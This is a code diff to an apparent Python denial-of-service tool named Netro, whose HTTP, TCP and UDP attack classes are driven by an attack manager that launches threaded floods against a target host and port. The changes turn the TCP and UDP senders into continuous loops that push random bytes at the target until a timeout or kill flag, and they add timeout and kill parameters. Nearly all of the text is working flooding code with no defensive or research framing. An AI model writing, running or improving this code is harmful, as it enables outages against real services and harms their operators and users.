@@ -7,6 +7,7 @@ import json
 import ssl
 
 class NetroHTTP(object):
+    kill = False
     active_threads = 0
 
     def __init__(self, url: str):
@@ -86,14 +87,20 @@ class NetroHTTP(object):
             self.active_threads -= 1
 
 class NetroTCP(object):
+    kill = False
     active_threads = 0
 
-    def __init__(self, target: str):
+    def __init__(self, target: str, timeout: int):
         host, port = target.split(":", 1)
         port = int(port)
 
-        if any ([port < 1, port > 65535]):
+        if any([port < 1, port > 65535]):
             raise Exception("Invalid port value.")
+        
+        if timeout < 10:
+            raise Exception("Invalid timeout value.")
+        
+        self.timeout = timeout
 
         self.host = host
         self.port = port
@@ -106,24 +113,29 @@ class NetroTCP(object):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(10)
             sock.connect((self.host_ip, self.port))
-            sock.send(random._urandom(random.randrange(512, 1024)))
+            while time.time() < self.timeout and not self.kill:
+                sock.send(random._urandom(16))
 
-            time.sleep(1)
         except Exception:
             return
         finally:
             self.active_threads -= 1
 
 class NetroUDP(object):
+    kill = False
     active_threads = 0
 
-    def __init__(self, target: str):
+    def __init__(self, target: str, timeout: int):
         host, port = target.split(":", 1)
         port = int(port)
 
         if any([port < 1, port > 65535]):
             raise Exception("Invalid port value.")
         
+        if timeout < 10:
+            raise Exception("Invalid timeout value.")
+        
+        self.timeout = timeout
         self.host = host
         self.port = port
         self.host_ip = socket.gethostbyname(host)
@@ -133,7 +145,8 @@ class NetroUDP(object):
 
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.sendto(random._urandom(random.randrange(512, 1024)), (self.host_ip, self.port))
+            while time.time() < self.timeout and not self.kill:
+                sock.sendto(random._urandom(1024), (self.host_ip, self.port))
         except Exception:
             return
         finally:
@@ -154,9 +167,9 @@ class NetroAttackManager(object):
             case "http":
                 netro_attack = NetroHTTP(url=target)
             case "tcp":
-                netro_attack = NetroTCP(target=target)
+                netro_attack = NetroTCP(target=target, timeout=timeout)
             case "udp":
-                netro_attack = NetroUDP(target=target)
+                netro_attack = NetroUDP(target=target, timeout=timeout)
         
         while time.time() < timeout and attack_id in self.running_attacks:
             time.sleep(0.01)
@@ -166,6 +179,7 @@ class NetroAttackManager(object):
 
             threading.Thread(target=netro_attack.create_attack_instance, daemon=True).start()
         
+        netro_attack.kill = True
         self.stop_attack(attack_id=attack_id)
     
     def launch_attack(self, attack_id: str, attack_payload: dict):
